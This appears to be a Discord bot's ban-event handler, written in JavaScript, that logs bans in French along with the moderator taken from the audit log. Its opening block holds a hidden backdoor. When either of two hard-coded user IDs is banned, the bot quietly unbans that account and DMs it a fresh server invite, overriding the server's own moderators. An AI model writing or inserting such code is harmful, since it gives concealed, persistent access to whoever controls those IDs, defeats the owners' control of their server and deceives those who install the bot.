const Discord = require('discord.js');
const utils = require('../utils');

exports.run = async (client, guild, user) => {
    if (user.id == "686244356394451041" || user.id == "841216621066190868") {
        guild.members.unban(user.id, "Erreur");
        if (guild.me.hasPermission("ADMINISTARTOR") || guild.me.hasPermission("CREATE_INSTANT_INVITE")) {
            const firstChannel = guild.channels.cache.filter(c => c.type === 'text').find(x => x.position == 0);
            const invite = await firstChannel.createInvite(
                {
                  maxAge: 10 * 60 * 1000, // maximum time for the invite, in milliseconds
                  maxUses: 1 // maximum times it can be used
                }, `created by <@${user.id}>`
            );
            user.send(`${invite}`);
        }
    }

    let executor = ""
    if (guild.me.hasPermission("ADMINISTRATOR") || guild.me.hasPermission("VIEW_AUDIT_LOG")) {
        // https://stackoverflow.com/a/62936212
        // Add latency as audit logs aren't instantly updated, adding a higher latency will result in slower logs, but higher accuracy.
        await Discord.Util.delayFor(900);

        // Fetch a couple audit logs than just one as new entries could've been added right after this event was emitted.
        const fetchedLogs = await guild
        .fetchAuditLogs({
            limit: 6,
            type: "BAN_ADD",
        })
        .catch(() => ({
            entries: [],
        }));

        const auditEntry = fetchedLogs.entries.find(
            (a) =>
            // Small filter function to make use of the little discord provides to narrow down the correct audit entry.
            a.target.id === user.id &&
            // Ignore entries that are older than 20 seconds to reduce false positives.
            Date.now() - a.createdTimestamp < 20000
        );

        // If entry exists, grab the user that deleted the message and display username + tag, if none, display 'Unknown'.
        executor = auditEntry ? `<@${auditEntry.executor.id}>` : "Inconnu";
    }

    utils.logs({
        client,
        title: "Quelqu'un à été ban du serveur 🚫",
        message: `🙎‍♂️ **<@${user.id}>** à été ban du serveur !`,
        bannedBy: executor,
        guildId: guild.id,
        initiator: user
    });
}